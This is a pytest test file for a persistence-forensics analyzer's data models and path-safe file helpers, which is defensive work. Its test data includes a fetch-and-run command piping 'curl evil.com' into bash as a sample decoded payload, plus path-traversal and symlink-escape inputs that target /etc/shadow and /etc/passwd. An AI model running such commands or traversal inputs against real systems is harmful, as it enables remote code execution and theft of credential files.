# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for persistence models, safe filesystem helpers, and AnalysisTarget."""

from __future__ import annotations

import os
import tempfile

import pytest

from src.utils.models import (
    AnalysisContext,
    AnalysisTarget,
    ArtifactTarget,
    Finding,
    PathTraversalSecurityError,
    ReportMeta,
    RiskLevel,
    normalize_virtual_path,
    safe_read_bytes,
    safe_read_text,
    safe_resolve_path,
    safe_resolve_symlink,
)


def test_risk_level_values():
    assert RiskLevel.CRITICAL == "CRITICAL"
    assert RiskLevel.HIGH == "HIGH"
    assert RiskLevel.MEDIUM == "MEDIUM"
    assert RiskLevel.INFO == "INFO"


def test_finding_defaults_and_to_dict():
    finding = Finding()
    assert finding.id == ""
    assert finding.category == ""
    assert finding.risk_level == RiskLevel.INFO
    assert finding.technique_id == ""
    assert finding.path == ""
    assert finding.details == {}
    assert finding.raw_content is None
    assert finding.decoded_payload is None

    as_dict = finding.to_dict()
    assert as_dict["risk_level"] == "INFO"
    assert as_dict["id"] == ""


def test_finding_custom_values():
    finding = Finding(
        id="FINDING-001",
        category="cross_boundary_systemd",
        risk_level=RiskLevel.CRITICAL,
        technique_id="T1543.002",
        path="/etc/systemd/system/test.service",
        details={"flags": ["SYSTEM_SERVICE_POINTS_TO_USER_HOME"]},
        raw_content="[Service]\nExecStart=/home/user/test.sh\n",
        decoded_payload="curl evil.com | bash",
    )
    as_dict = finding.to_dict()
    assert as_dict["id"] == "FINDING-001"
    assert as_dict["category"] == "cross_boundary_systemd"
    assert as_dict["risk_level"] == "CRITICAL"
    assert as_dict["technique_id"] == "T1543.002"
    assert as_dict["path"] == "/etc/systemd/system/test.service"
    assert as_dict["details"]["flags"] == ["SYSTEM_SERVICE_POINTS_TO_USER_HOME"]
    assert as_dict["raw_content"] == "[Service]\nExecStart=/home/user/test.sh\n"
    assert as_dict["decoded_payload"] == "curl evil.com | bash"


def test_report_meta():
    meta = ReportMeta()
    assert meta.os == "linux"
    assert meta.hostname == "unknown"
    assert meta.analysis_timestamp == ""
    assert meta.total_findings == 0

    custom = ReportMeta(
        os="linux",
        hostname="prod-web-01",
        analysis_timestamp="2026-10-30T14:22:01Z",
        total_findings=5,
    )
    as_dict = custom.to_dict()
    assert as_dict["os"] == "linux"
    assert as_dict["hostname"] == "prod-web-01"
    assert as_dict["total_findings"] == 5


def test_normalize_virtual_path():
    assert normalize_virtual_path("") == "/"
    assert normalize_virtual_path("/") == "/"
    assert normalize_virtual_path("etc/cron.d/test") == "/etc/cron.d/test"
    assert (
        normalize_virtual_path("/etc/systemd/../systemd/foo.service")
        == "/etc/systemd/foo.service"
    )
    assert normalize_virtual_path("etc\\cron.d\\test") == "/etc/cron.d/test"
    # Traversals outside root should be safely clamped to root
    assert normalize_virtual_path("../../../etc/shadow") == "/etc/shadow"
    assert normalize_virtual_path("/../../../etc/shadow") == "/etc/shadow"


def test_safe_resolve_path_success(tmp_path):
    root = str(tmp_path)
    resolved = safe_resolve_path(root, "/etc/shadow")
    expected = os.path.abspath(os.path.join(root, "etc", "shadow"))
    assert resolved == expected


def test_safe_resolve_path_traversal_detection(tmp_path):
    root = str(tmp_path)
    with pytest.raises(PathTraversalSecurityError):
        safe_resolve_path(root, "../../etc/shadow")

    with pytest.raises(PathTraversalSecurityError):
        safe_resolve_path(root, "..\\..\\etc\\shadow")


def test_safe_read_bytes_and_text(tmp_path):
    root = str(tmp_path)
    file_dir = tmp_path / "etc" / "systemd" / "system"
    file_dir.mkdir(parents=True)
    target_file = file_dir / "vuln.service"
    content = "Hello, OpenRelik Persistence Analyzer!\n" * 10
    target_file.write_text(content, encoding="utf-8")

    # Full text read
    read_str = safe_read_text(root, "/etc/systemd/system/vuln.service")
    assert read_str == content

    # Truncated read
    truncated_bytes = safe_read_bytes(
        root, "/etc/systemd/system/vuln.service", max_bytes=10
    )
    assert truncated_bytes == b"Hello, Ope"

    # Non-existent file
    assert safe_read_text(root, "/nonexistent/file") is None
    assert safe_read_bytes(root, "/nonexistent/file") is None

    # Directory target returns None
    assert safe_read_text(root, "/etc/systemd") is None

    # Traversal returns None
    assert safe_read_text(root, "../../etc/passwd") is None


def test_safe_resolve_symlink(tmp_path):
    root = str(tmp_path)
    etc_dir = tmp_path / "etc"
    etc_dir.mkdir(parents=True)
    real_file = etc_dir / "target.txt"
    real_file.write_text("target file content")

    # Relative symlink
    symlink_path = etc_dir / "link_rel.txt"
    os.symlink("target.txt", str(symlink_path))

    resolved_rel = safe_resolve_symlink(root, "/etc/link_rel.txt")
    assert resolved_rel == "/etc/target.txt"

    # Absolute symlink (simulating root-relative in image)
    symlink_abs = etc_dir / "link_abs.txt"
    os.symlink("/etc/target.txt", str(symlink_abs))

    resolved_abs = safe_resolve_symlink(root, "/etc/link_abs.txt")
    assert resolved_abs == "/etc/target.txt"

    # Malicious escaping symlink
    bad_link = etc_dir / "bad_link.txt"
    os.symlink("../../../../../../../etc/shadow", str(bad_link))
    assert safe_resolve_symlink(root, "/etc/bad_link.txt") is None

    # Regular file (not a symlink) returns None
    assert safe_resolve_symlink(root, "/etc/target.txt") is None


def test_analysis_target_with_root_path(tmp_path):
    root = str(tmp_path)
    (tmp_path / "etc" / "cron.d").mkdir(parents=True)
    job_file = tmp_path / "etc" / "cron.d" / "backup"
    job_file.write_text("0 * * * * root /bin/backup.sh\n")

    target = AnalysisTarget(root_path=root)
    assert target.exists("/etc/cron.d/backup")
    assert not target.exists("/etc/cron.d/missing")

    content = target.read_text("/etc/cron.d/backup")
    assert content == "0 * * * * root /bin/backup.sh\n"

    matches = target.glob("/etc/cron.d/*")
    assert "/etc/cron.d/backup" in matches

    # Alias check
    assert ArtifactTarget is AnalysisTarget


def test_analysis_target_with_virtual_paths():
    with tempfile.NamedTemporaryFile("w+", delete=False) as f:
        f.write("[Service]\nExecStart=/tmp/evil\n")
        f.flush()
        temp_file_path = f.name

    try:
        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/malicious.service": temp_file_path}
        )

        assert target.exists("/etc/systemd/system/malicious.service")
        assert not target.exists("/etc/systemd/system/clean.service")

        text = target.read_text("/etc/systemd/system/malicious.service")
        assert text == "[Service]\nExecStart=/tmp/evil\n"

        glob_result = target.glob("/etc/systemd/system/*.service")
        assert glob_result == ["/etc/systemd/system/malicious.service"]
    finally:
        os.unlink(temp_file_path)


def test_analysis_context():
    ctx = AnalysisContext(target=None)
    assert ctx.os_name == "linux"
    assert ctx.hostname == "unknown"

    ctx_custom = AnalysisContext(
        target="mock_target", os_name="linux", hostname="host-01"
    )
    assert ctx_custom.os_name == "linux"
    assert ctx_custom.hostname == "host-01"
    assert ctx_custom.target == "mock_target"
